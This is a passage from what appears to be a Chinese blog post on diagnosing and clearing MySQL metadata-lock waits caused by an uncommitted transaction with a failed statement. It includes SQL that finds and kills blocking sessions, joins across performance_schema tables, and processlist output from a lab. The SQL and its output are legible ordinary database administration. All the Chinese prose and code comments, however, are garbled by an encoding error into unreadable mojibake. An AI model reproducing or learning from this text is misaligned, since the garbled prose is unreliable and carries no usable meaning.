¹æœ¬ä¸ä¼šè¢«è®°å½•åˆ°äºŒè¿›åˆ¶æ—¥å¿—</li><li>è§£å†³æ–¹æ³•ï¼šç¡®è®¤æœ‰é”™è¯¯äº‹åŠ¡æœªæäº¤æˆ–å›æ»šï¼Œæ‰¾åˆ°è¯¥äº‹åŠ¡çš„sessionidç„¶åæ€æ­»ï¼ˆéš¾ç‚¹ï¼‰</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> åœºæ™¯3çš„å‡ºç°å’Œå‰ä¸¤ç§ä¸åŒ</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹çº¿ç¨‹æƒ…å†µï¼Œçœ‹åˆ°alteræ“ä½œmetadataé”ï¼Œè¿˜æœ‰å…¶ä»–çš„selectæ“ä½œæœ‰metadataé”</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ç¬¬ä¸€ååº”å°±æ˜¯æœ‰å¯èƒ½æ˜¯åœºæ™¯1ï¼Œäºæ˜¯killæ‰æ‰§è¡Œselectçš„çº¿ç¨‹ï¼Œå†æ¬¡æŸ¥çœ‹çº¿ç¨‹æƒ…å†µï¼Œå°±åªå‰©ä¸‹æ‰§è¡Œalterçº¿ç¨‹äº†</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># æ¥ä¸‹æ¥æŸ¥çœ‹æœªå®Œæˆçš„äº‹åŠ¡ï¼Œå¦‚æœæ˜¯åœºæ™¯1ï¼Œåœ¨killæ‰å†²çªçš„çº¿ç¨‹ååº”è¯¥å‡ºç°ä¸¤ç§æƒ…å†µï¼ˆA.alteræ“ä½œæ­£å¸¸æ‰§è¡ŒB.çº¿ç¨‹ä¸­åªæœ‰alteræ“ä½œä¸ºwaiting metadata lockçŠ¶æ€ï¼›æœªå®Œæˆäº‹åŠ¡ä¸­å­˜åœ¨æœªå®Œæˆäº‹åŠ¡ï¼‰</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># ä½†æ˜¯å´å‘ç°å’ŒBæƒ…å†µæœ‰æ‰€ä¸åŒçš„æ˜¯ï¼šæœªå®Œæˆäº‹åŠ¡ä¸­ä¸å­˜åœ¨æœªå®Œæˆäº‹åŠ¡ï¼Œæ€»ç»“ç¬¬ä¸‰ç§æƒ…å†µ(C.çº¿ç¨‹ä¸­åªæœ‰alteræ“ä½œä¸ºwaiting metadata lockçŠ¶æ€ï¼›æœªå®Œæˆäº‹åŠ¡ä¸­ä¸å­˜åœ¨æœªå®Œæˆäº‹åŠ¡ï¼‰</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> é€šè¿‡æœç´¢èµ„æ–™å®šä½åˆ°æ˜¯åœºæ™¯3ï¼Œä½†èµ„æ–™ä¸­æ²¡æœ‰è¯´æ€ä¹ˆè§£å†³é—®é¢˜ï¼Œåˆä¸èƒ½é‡æ–°å¯åŠ¨æœåŠ¡å™¨ï¼Œåªæœ‰ä¸€ä¸ªèµ„æ–™é‡Œæåˆ°äº†æ–¹æ³•ï¼ˆç¡®è®¤æœ‰é”™è¯¯äº‹åŠ¡æœªæäº¤æˆ–å›æ»šï¼Œæ‰¾åˆ°è¯¥äº‹åŠ¡çš„sessionidç„¶åæ€æ­»ï¼Œå…³é”®å°±æ˜¯å¦‚ä½•æ‰¾åˆ°sessionidå‘¢ï¼Ÿperformance_schema.events_statements_currentä¸­çš„thread_idä¸ºçº¿ç¨‹idå¹¶ä¸æ˜¯sessionidæˆ–è€…è¯´ä¼šè¯idã€è¿æ¥idï¼Œå¦‚ä½•é€šè¿‡thread_idæ‰¾åˆ°session_idæˆä¸ºäº†éš¾ç‚¹ï¼Ÿ5.7ä¸­æœ‰ä¸ªsessionè¡¨å¯ä»¥ç›´æ¥æŸ¥åˆ°ï¼Œè€Œ5.6ä¸­å¿…é¡»é€šè¿‡ä¸‰è¡¨æ‰èƒ½æŸ¥åˆ°ï¼Œåˆ†åˆ«ä¸ºperformance_schema.events_statements_current,performance_schema.threads,information_schema.processlistè¡¨ã€‚ï¼‰</span></span><br><span class="line">=====================================================================================</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>æ‰é™¤äº†å†™æ“ä½œä»¥å¤–çš„query</span></span><br><span class="line">select concat('kill ',id) from information_schema.processlist where State="Waiting for table metadata lock" and substring(info, 1, 5) not in ('alter' , 'optim', 'repai', 'lock ', 'drop ', 'creat');</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¯»æ‰¾æœªæäº¤æˆ–æœªå›æ»šçš„é”™è¯¯äº‹åŠ¡ï¼Œå¹¶<span class="built_in">kill</span>å³å¯</span></span><br><span class="line">select t.processlist_id,t.processlist_time,e.sql_text from performance_schema.threads t,performance_schema.events_statements_current e where t.thread_id=e.thread_id and e.SQL_TEXT like '%t1%';</span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¡ˆä¾‹ä¸­å‡è®¾æ˜¯åœ¨t1è¡¨ä¸Šæœ‰MDLé”ï¼Œåˆ™ï¼Œe.sql_text è¿‘ä¼¼åŒ¹é…t1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æœ¬æ–¹æ³•5.5 5.6 5.7 éƒ½é€šç”¨ã€‚</span></span><br><span class="line">=============================================================================</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ­¥ï¼šæ¨¡æ‹Ÿç¬¬ä¸‰ç§æƒ…å†µï¼Œä¼šè¯11æ‰§è¡Œä¸€ä¸ªæ˜¾ç¤ºäº‹åŠ¡ï¼Œä¸”queryå‡ºç°åˆ—é”™è¯¯ï¼Œt1è¡¨ä¸­ä¸å­˜åœ¨xxåˆ—ï¼Œä¸æäº¤ã€‚</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%5Cmdl01.png" alt=""></p><p>ç¬¬äºŒæ­¥ï¼šä¼šè¯14ä¸­æ‰§è¡Œalteræ“ä½œ</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl02.png" alt="mdl02"></p><p>ç¬¬ä¸‰æ­¥ï¼šæ‰§è¡Œä¸€æ¡query</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl03.png" alt="mdl03"></p><p>ç¬¬å››æ­¥ï¼šä¼šè¯15æ‰§è¡Œä¸€ä¸ªæ˜¾ç¤ºäº‹åŠ¡ï¼ŒæŸ¥è¯¢t1è¡¨</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl04.png" alt="mdl04"></p><p>ç¬¬äº”æ­¥ï¼šæŸ¥çœ‹å½“å‰çš„processlistæƒ…å†µï¼Œå¯ä»¥çœ‹åˆ°åªè¦æ˜¯å¯¹t1è¡¨çš„æ“ä½œéƒ½å‡ºç°äº†MDLé”ç­‰å¾…ï¼›å°è¯•é€šè¿‡ç¬¬ä¸€ç§æƒ…å†µçš„è§£å†³æ–¹æ³•æ‰¾å‡ºé˜»å¡çš„äº‹åŠ¡ä¼šè¯è¿›è¡Œkillï¼Œå‘ç°ä¸å­˜åœ¨é˜»å¡ä¼šè¯ï¼›æŸ¥çœ‹å½“å‰æœªæäº¤çš„äº‹åŠ¡å‘ç°è¿”å›ç©ºï¼›é€šè¿‡è¿‡æ»¤processlistä¸­è¿›è¡ŒMDLé”ç­‰å¾…ä¸”ä¸æ˜¯alterçš„ä¼šè¯idï¼Œè¿›è¡Œkillã€‚</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl06.png" alt="mdl06"></p><p>ç¬¬å…­æ­¥ï¼šåªkill 12ï¼Œ15ï¼Œç•™ä¸‹æ‰§è¡Œalterçš„ä¼šè¯14ï¼›æœ‰äººä¼šæƒ³ä¸ºä»€ä¹ˆéƒ½killæ‰å‘¢ï¼Ÿå› ä¸ºå³ä½¿ç°åœ¨killæ‰äº†ï¼Œt1è¡¨çš„MDLé”ä¹Ÿä¸ä¼šé‡Šæ”¾æ‰ï¼Œè¿˜ä¸å¦‚ç•™ä¸‹ä¼šè¯14çš„ddlæ“ä½œï¼Œç­‰å½»åº•è§£å†³äº†ï¼Œè‡ªç„¶å°±èƒ½æ‰§è¡Œè¿™ä¸ªæ“ä½œã€‚å…·ä½“å¯ä»¥çœ‹ä¸‹é¢çš„åˆ†æã€‚</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl07.png" alt="mdl07"></p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl08.png" alt="mdl08"></p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl09.png" alt="mdl09"></p><p>ç¬¬ä¸ƒæ­¥ï¼šç»™å¤§å®¶åšä¸ªæµ‹è¯•ï¼Œå³ä½¿å°†ä¼šè¯14çš„alteråŠ¨ä½œkillæ‰ï¼š</p><ul><li>processlistä¸­çœ‹ä¸åˆ°ä»»ä½•ç­‰å¾…MDLé”çš„ä¼šè¯ï¼›</li><li>sys.schema_table_lock_waitsä¸­ä¹Ÿä¸å­˜åœ¨è¡¨é”ï¼ˆ5.7æ‰æœ‰sysåº“ï¼‰ï¼›</li><li>performance_schema.metadata_locksä¸­ä¹Ÿä¸å­˜åœ¨ä»»ä½•é”è®°å½•ï¼›</li><li>ä¼šè¯16æƒ³å†å»æ‰§è¡Œalteræ“ä½œï¼Œåˆå¼€å§‹äº†MDLé”ç­‰å¾…ã€‚</li></ul><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl10.png" alt="mdl10"></p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl11.png" alt="mdl11"></p><p>ç¬¬å…«æ­¥ï¼šæ­¤æ—¶å°±ä¸€å®šå¯ä»¥ç¡®å®šå½“å‰å±äºã€<strong>æœ‰é”™è¯¯äº‹åŠ¡æœªæäº¤æˆ–å›æ»šå¯¼è‡´çš„MDLé”</strong>ã€‘çš„æƒ…å†µäº†ã€‚æˆ‘ä»¬æ‰¾å‡ºè¿™ä¸ªé”™è¯¯äº‹åŠ¡ï¼Œè¿›è¡Œkill</p><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl12.png" alt="mdl12"></p><p>ç¬¬ä¹æ­¥ï¼škillæ‰ä¼šè¯11åï¼ŒæˆåŠŸå°†MDLé”é‡Šæ”¾ã€‚</p><blockquote><p>æœ‰äººåˆä¼šé—®å’¯ï¼šä¸ºä»€ä¹ˆä¸å°†æ•°æ®åº“é‡å¯ï¼Ÿ</p><p>å›ç­”ï¼š</p><p>å¦‚æœè¯´â€”â€”</p><ol><li><p>ä¸šåŠ¡å…è®¸é‡å¯</p></li><li><p>ä¸æƒ³æ‰¾åˆ°é—®é¢˜çš„æ ¹æº</p><p>é‚£ä¹ˆé‡å¯å§</p></li></ol><p>å¦‚æœè¯´â€”â€” </p><ol><li><p>æ•°æ®åº“ä¸Šé¢å¤šä¸ªåº“ï¼Œå…³è”å¤šä¸ªä¸šåŠ¡ï¼Œä¸èƒ½é‡å¯</p></li><li><p>æƒ³æ‰¾åˆ°é—®é¢˜çš„æ ¹æºï¼Œé˜²æ­¢ä¸‹æ¬¡å†æ¬¡å‡ºç°ç±»ä¼¼çš„é—®é¢˜</p><p>é‚£ä¹ˆä½ æ‡‚çš„</p></li></ol><p>é‚£ä¹ˆä¸ºä»€ä¹ˆä¸ç›´æ¥killæ‰€æœ‰ä¼šè¯å‘¢ï¼ŸåŒæ ·å¦‚æœä½ è¦æ‰¾å‡ºé—®é¢˜çš„æ ¹æºé‚£ä¹ˆå°±æ’æŸ¥ï¼Œä¸æƒ³é—®ä¸ºä»€ä¹ˆå°±ç›´æ¥killå§ï¼Œæœ«å°¾æœ‰killçš„è„šæœ¬</p></blockquote><p><img src="MySQL%E7%9A%84%E5%85%83%E9%94%81MDL%E5%8F%91%E7%94%9F%E5%9C%BA%E6%99%AF%E5%92%8C%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/mdl13.png" alt="mdl13"></p><p>ä¸€æ­¥æ­¥åˆ†æå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                                                                                   </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |   17 | Waiting for table metadata lock | alter table booboo add q9 int default 0 |</span><br><span class="line">|  7 | root | localhost | uplooking | Query   |   11 | Waiting for table metadata lock | select * from booboo                    |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 14 | root | localhost | uplooking | Query   |    5 | Waiting for table metadata lock | select * from booboo where id=3         |</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |   28 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 7 ;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 14;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show processlist;                                                                                                                                                                   </span></span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">| Id | User | Host      | db        | Command | Time | State                           | Info                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">|  6 | root | localhost | uplooking | Query   |   86 | Waiting for table metadata lock | alter table booboo add q9 int default 0 |</span><br><span class="line">|  8 | root | localhost | uplooking | Query   |    0 | starting                        | show processlist                        |</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |   97 |                                 | NULL                                    |</span><br><span class="line">+----+------+-----------+-----------+---------+------+---------------------------------+-----------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select  timediff(sysdate(),trx_started) timediff,sysdate(),trx_started,id,USER,DB,COMMAND,STATE,trx_state,trx_query from information_schema.processlist,information_schema.innodb_trx <span class="built_in">where</span> trx_mysql_thread_id=id;</span></span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å¦‚æœç¬¦åˆæƒ…å†µCï¼Œéœ€è¦å»æŸ¥çœ‹performance_schema.events_statements_currentè¡¨ä¸­æ˜¯å¦æœ‰å¯¹boobooçš„é”™è¯¯è¯­å¥ï¼ˆè¿™é‡Œçš„é”™è¯¯è¯­å¥æ˜¯éè¯­æ³•é”™è¯¯çš„ï¼Œä¾‹å¦‚selectä¸­å†™äº†ä¸å­˜åœ¨çš„åˆ—ç­‰æƒ…å†µï¼‰</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä»ä¸‹é¢çš„æŸ¥è¯¢ç»“æœå¯ä»¥çœ‹åˆ°ï¼Œç¡®å®å­˜åœ¨ä¸€ä¸ªé”™è¯¯è¯­å¥äº‹ä»¶</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> é€šè¿‡è¯¥é”™è¯¯è¯­å¥äº‹ä»¶çš„THREAD_IDï¼Œåˆ°performance_schema.threadsè¡¨æŸ¥åˆ°è¯¥çº¿ç¨‹å¯¹åº”çš„PROCESSLIST_IDï¼Œè€ŒPROCESSLIST_IDè¿›ç¨‹idç­‰äºprocesslistä¸­çš„id</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from performance_schema.events_statements_current <span class="built_in">where</span> SQL_TEXT like <span class="string">'%booboo%'</span>\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">              THREAD_ID: 31</span><br><span class="line">               EVENT_ID: 16</span><br><span class="line">           END_EVENT_ID: NULL</span><br><span class="line">             EVENT_NAME: statement/sql/alter_table</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3292336129737000</span><br><span class="line">              TIMER_END: 3521408438190000</span><br><span class="line">             TIMER_WAIT: 229072308453000</span><br><span class="line">              LOCK_TIME: 0</span><br><span class="line">               SQL_TEXT: alter table booboo add q9 int default 0</span><br><span class="line">                 DIGEST: NULL</span><br><span class="line">            DIGEST_TEXT: NULL</span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 0</span><br><span class="line">      RETURNED_SQLSTATE: NULL</span><br><span class="line">           MESSAGE_TEXT: NULL</span><br><span class="line">                 ERRORS: 0</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 0</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 0</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 0</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">*************************** 2. row ***************************</span><br><span class="line">              THREAD_ID: 33</span><br><span class="line">               EVENT_ID: 74</span><br><span class="line">           END_EVENT_ID: NULL</span><br><span class="line">             EVENT_NAME: statement/sql/select</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3521408132304000</span><br><span class="line">              TIMER_END: 3521408462141000</span><br><span class="line">             TIMER_WAIT: 329837000</span><br><span class="line">              LOCK_TIME: 184000000</span><br><span class="line">               SQL_TEXT: select * from performance_schema.events_statements_current where SQL_TEXT like '%booboo%'</span><br><span class="line">                 DIGEST: NULL</span><br><span class="line">            DIGEST_TEXT: NULL</span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 0</span><br><span class="line">      RETURNED_SQLSTATE: NULL</span><br><span class="line">           MESSAGE_TEXT: NULL</span><br><span class="line">                 ERRORS: 0</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 1</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 1</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 1</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">*************************** 3. row ***************************</span><br><span class="line">              THREAD_ID: 40</span><br><span class="line">               EVENT_ID: 8</span><br><span class="line">           END_EVENT_ID: 8</span><br><span class="line">             EVENT_NAME: statement/sql/select</span><br><span class="line">                 SOURCE: socket_connection.cc:101</span><br><span class="line">            TIMER_START: 3280938133699000</span><br><span class="line">              TIMER_END: 3280938258470000</span><br><span class="line">             TIMER_WAIT: 124771000</span><br><span class="line">              LOCK_TIME: 0</span><br><span class="line">               SQL_TEXT: select abc from booboo</span><br><span class="line">                 DIGEST: 871dd43dfdfb143e81439bbe7bf7b57e</span><br><span class="line">            DIGEST_TEXT: SELECT `abc` FROM `booboo` </span><br><span class="line">         CURRENT_SCHEMA: uplooking</span><br><span class="line">            OBJECT_TYPE: NULL</span><br><span class="line">          OBJECT_SCHEMA: NULL</span><br><span class="line">            OBJECT_NAME: NULL</span><br><span class="line">  OBJECT_INSTANCE_BEGIN: NULL</span><br><span class="line">            MYSQL_ERRNO: 1054</span><br><span class="line">      RETURNED_SQLSTATE: 42S22</span><br><span class="line">           MESSAGE_TEXT: Unknown column 'abc' in 'field list'</span><br><span class="line">                 ERRORS: 1</span><br><span class="line">               WARNINGS: 0</span><br><span class="line">          ROWS_AFFECTED: 0</span><br><span class="line">              ROWS_SENT: 0</span><br><span class="line">          ROWS_EXAMINED: 0</span><br><span class="line">CREATED_TMP_DISK_TABLES: 0</span><br><span class="line">     CREATED_TMP_TABLES: 0</span><br><span class="line">       SELECT_FULL_JOIN: 0</span><br><span class="line"> SELECT_FULL_RANGE_JOIN: 0</span><br><span class="line">           SELECT_RANGE: 0</span><br><span class="line">     SELECT_RANGE_CHECK: 0</span><br><span class="line">            SELECT_SCAN: 0</span><br><span class="line">      SORT_MERGE_PASSES: 0</span><br><span class="line">             SORT_RANGE: 0</span><br><span class="line">              SORT_ROWS: 